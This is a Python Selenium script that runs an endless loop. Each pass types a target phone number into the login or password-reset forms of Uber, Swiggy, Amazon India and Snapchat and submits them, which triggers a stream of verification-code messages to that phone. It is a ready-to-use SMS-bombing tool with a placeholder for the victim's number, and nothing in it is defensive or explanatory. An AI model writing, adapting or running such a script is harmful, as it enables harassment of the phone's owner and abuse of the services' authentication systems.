from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import asyncio
options = Options()
options.add_experimental_option('detach', True)

driver = webdriver.Chrome(service=Service(
    ChromeDriverManager().install()), options=options)

driver.maximize_window()


number = 'Enter your number here'

while True:
        


    # UBER

    driver.get("https://auth.uber.com/v2/?breeze_local_zone=phx3&next_url=https%3A%2F%2Fm.uber.com%2F&state=QmkIBgpRkBk7CIw7elYarNmFSTu9uapHKUnWa1E9-R0%3D")

    time.sleep(2)

    driver.find_element(
        "id", "PHONE_NUMBER_or_EMAIL_ADDRESS").send_keys(number)
    driver.find_element(
        "xpath", "/html/body/div[1]/div/div[2]/div/div/div[1]/div[2]/button").click()

    # SWIGGY

    driver.get("https://swiggy.com/")

    time.sleep(2)

    driver.find_element(
        "xpath", "/html/body/div/div[1]/div[1]/div/div[1]/div[1]/div/div[1]/div/a[1]").click()
    driver.find_element(
        'name', 'mobile').send_keys(number)

    driver.find_element(
        "xpath", "/html/body/div[2]/div/div/div[2]/div/div/div/form/div[2]/a").click()


    ## AMAZON

    driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

    time.sleep(2)

    driver.find_element(
        'xpath', "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div[1]/form/div/div/div/div[1]/input[1]"
    ).send_keys(number)


    driver.find_element(
        'xpath', "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div[1]/form/div/div/div/div[2]/span/span/input").click()
    driver.find_element(
        'xpath', "/html/body/div[1]/div[1]/div[2]/div/div[2]/div[3]/form/span/span/input").click()


 
    ## SNAPCHAT

    driver.get("https://accounts.snapchat.com/accounts/password_reset/phone")

    time.sleep(2)

    try:
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "reset-password-by-phone"))
        )
        driver.find_element(
            "xpath", "/html/body/div/div/main/div[1]/div/div/div[3]/form/div[1]/div/div[2]/div/input").send_keys(number)

        driver.find_element(
            "xpath", "/html/body/div/div/main/div[1]/div/div/div[3]/form/div[3]/button").click()

    finally:
        print("s")
